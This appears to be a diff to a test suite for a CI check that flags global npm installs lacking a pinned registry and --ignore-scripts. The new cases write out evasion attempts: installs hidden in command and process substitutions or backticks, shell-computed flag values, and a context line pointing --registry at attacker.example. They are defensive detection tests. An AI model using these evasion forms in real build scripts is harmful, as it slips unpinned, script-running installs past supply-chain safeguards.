@@ -698,7 +698,8 @@ describe("a global install names where the package comes from", () => {
     }
   }
 
-  const PINNED = "--ignore-scripts --registry https://registry.npmjs.org/";
+  const REGISTRY = "--registry https://registry.npmjs.org/";
+  const PINNED = `--ignore-scripts ${REGISTRY}`;
 
   for (const [label, command, finding] of [
     [
@@ -908,6 +909,88 @@ describe("a global install names where the package comes from", () => {
       "npm i -g --ignore-scripts --registry\\=https://attacker.example/ corepack@0.35.0",
       /--registry naming a trusted registry/,
     ],
+    // An install inside a command or process substitution is a command of its own.
+    [
+      "an install in a command substitution assigned to a variable",
+      "x=$(npm i -g corepack@0.35.0)",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "an install in a command substitution argument",
+      "echo $(npm i -g corepack@0.35.0)",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "an install in a double-quoted command substitution",
+      'y="$(npm i -g corepack@0.35.0)"',
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "an install in a command substitution inside a test",
+      'test "$(npm i -g corepack@0.35.0)"',
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "an install in a process substitution",
+      "cat <(npm i -g corepack@0.35.0)",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "an install in a pipeline inside a command substitution",
+      "V=$(npm i -g corepack@0.35.0 | tail -1)",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "an install in backticks",
+      "x=`npm i -g corepack@0.35.0`",
+      /without --registry and --ignore-scripts/,
+    ],
+    [
+      "an assignment whose substitution holds a space, in front of the install",
+      "FOO=$(x y) npm -g i corepack@0.35.0",
+      /without --registry and --ignore-scripts/,
+    ],
+    // A value the shell computes can be `false`, however it is written.
+    [
+      "a command substitution as the spaced --ignore-scripts value",
+      `npm i -g ${REGISTRY} --ignore-scripts $(echo false) corepack@0.35.0`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "a command substitution reading a file as the spaced --ignore-scripts value",
+      `npm i -g ${REGISTRY} --ignore-scripts $(cat f) corepack@0.35.0`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "backticks as the spaced --ignore-scripts value",
+      `npm i -g ${REGISTRY} --ignore-scripts \`cat f\` corepack@0.35.0`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "a parameter expansion with a space as the spaced --ignore-scripts value",
+      `npm i -g ${REGISTRY} --ignore-scripts \${X:-a b} corepack@0.35.0`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "an arithmetic expansion as the spaced --ignore-scripts value",
+      `npm i -g ${REGISTRY} --ignore-scripts $((0)) corepack@0.35.0`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "an expression holding && and || as the spaced --ignore-scripts value",
+      `npm i -g ${REGISTRY} --ignore-scripts \${{ inputs.a == 'x' && 'false' || 'true' }} corepack@0.35.0`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "an expression that never closes as the --ignore-scripts value",
+      `npm i -g ${REGISTRY} --ignore-scripts \${{ env.V`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "a very long run of unterminated expressions, which must not stall the lane",
+      `npm i -g ${REGISTRY} --ignore-scripts ${"${{ ".repeat(5000)}`,
+      /literal --ignore-scripts value/,
+    ],
   ] as const) {
     it(`reports a global install that evades the pin check: ${label}`, () => {
       const run = runWithPlantedCommand(command);
@@ -944,6 +1027,16 @@ describe("a global install names where the package comes from", () => {
     ["--global=false", "npm install --global=false corepack@0.35.0"],
     ["a -g after the argument terminator, which is a package name", "npm install -- -g"],
     ["a message that quotes an unpinned install", 'echo "run npm i -g corepack@0.35.0"'],
+    ["a single-quoted command substitution, which is data", "echo '$(npm i -g corepack@0.35.0)'"],
+    ["a pinned install in a command substitution", `x=$(npm i -g ${PINNED} corepack@0.35.0)`],
+    [
+      "a long package argument built from variables, which must not stall the lane",
+      `npm i -g ${PINNED} ${"$X-".repeat(5000)}`,
+    ],
+    [
+      "a long package argument built from expressions, which must not stall the lane",
+      `npm i -g ${PINNED} ${"${{ a }}t".repeat(5000)}`,
+    ],
   ] as const) {
     it(`accepts ${label}`, () => {
       const run = runWithPlantedCommand(command);
